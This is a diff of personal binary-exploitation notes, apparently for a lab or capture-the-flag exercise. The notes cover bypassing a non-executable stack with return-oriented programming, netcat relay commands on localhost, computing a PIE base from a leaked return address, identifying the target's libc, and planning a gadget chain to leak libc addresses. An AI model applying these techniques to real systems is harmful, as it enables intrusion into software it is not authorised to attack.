@@ -246,24 +246,63 @@ wget my script onto server | hex to see canary
 # local stack execution?
 ################################################################################
 STACK IS NOT EXECUTABLE (RW), YOU MUST ROP:
-$readelf -f <file>
+$readelf -l <file>
 GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                0x0000000000000000 0x0000000000000000  RW     0x10
 
 ################################################################################
 ROP
 ################################################################################
-set up to give input:
-  mkfifo yourfifo
-  cat > yourfifo &
-  mypid=$!
-  yourprogram < yourfifo
+generic fifo instructions:
+  set up to give input:
+    mkfifo yourfifo
+    cat > yourfifo &
+    mypid=$!
+    yourprogram < yourfifo
 
-reverse tcp with nc:
-  nc -lvp 1337 -c "nc 127.0.0.1 5001" < attack
+  reverse tcp with nc:
+    nc -lvp 1337 -c "nc localhost 5001" < attack
+      must say localhost
 
-write into the connection:
-  nc -lvp 1337 -c "nc 127.0.0.1 5001"
+  write into the connection:
+    echo "p" > attack
 
+nc -lvp 1337 < attack
+echo "nc localhost 5001" > attack
+echo -e '\x01\x01\x61\x03' > attack
 
+local test 0:
+776d e277 5559 0000 <-ret raw
+00005559e277776d <-ret known
+00005559e2776000 <-base known
+000000000000176d <-diff
 
+local test 1:
+c76d b194 55c0 0000 <-ret raw
+000055c0b194c76d <-ret
+000055c0b194b000 <-base
+000000000000176d <-diff
+
+CONFIRMED BASE IS (ret - 0x176d)
+now just user ropper to find gadgets and add the
+  gadget address to the base.
+
+HOW TO FIND LIBC GADGETS?
+  1) find libc.so @ https://libc.blukat.me/?q=__libc_start_main_ret%3Ae81%2C_IO_2_1_stdin_%3A5c0
+    a) cat /proc/self/maps
+      /lib/x86_64-linux-gnu/libc-2.27.so
+    b) objdump -D /lib/x86_64-linux-gnu/libc-2.27.so | grep @@GLIBC
+        00000000003eba00 <_IO_2_1_stdin_@@GLIBC_2.2.5>:                
+    c) DL: libc6_2.27-3ubuntu1_amd64.so
+    d) md5sum of the victim .so and (c) .so are the same
+  
+ropper:   pop rdi; ret
+int:      SOCKFD
+ropper:   pop rsi; ret
+readelf:  got.send
+ropper:   pop rdx; ret
+objdump:  call write
+
+kinda nuts... go to c_files/local and see the sp.py
+rop is working to leak libc write and now we can calculate the offset
+now we only need to get gadgets in libc
